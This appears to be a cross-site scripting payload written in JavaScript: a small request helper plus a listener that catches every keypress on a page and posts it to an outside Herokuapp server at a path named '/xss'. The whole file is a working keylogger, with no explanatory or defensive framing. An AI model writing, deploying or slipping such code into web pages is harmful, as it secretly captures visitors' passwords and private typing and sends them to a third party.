
function ajaxRequest (method, url, data, cb) {
    var xmlHttp = new XMLHttpRequest()

    if (xmlHttp.overrideMimeType) {
        xmlHttp.overrideMimeType('text/plain; charset=x-user-defined')
    }

    xmlHttp.open(method, url, true)
    // xmlHttp.setRequestHeader('Content-Type', 'application/json');

    if (cb) {
        xmlHttp.onreadystatechange = function () {
            if (xmlHttp.readyState === 4) {
                cb(xmlHttp)
            }
        }
    }

    xmlHttp.setRequestHeader("Content-type", "application/json");
    xmlHttp.setRequestHeader('Access-Control-Allow-Headers', '*');
    xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '*');
    xmlHttp.send(data)
    return xmlHttp
}

document.addEventListener('keypress', function (e) {
    ajaxRequest('POST', 'http://blog-torf.herokuapp.com/xss', '{"key":' + e.key + '}')
})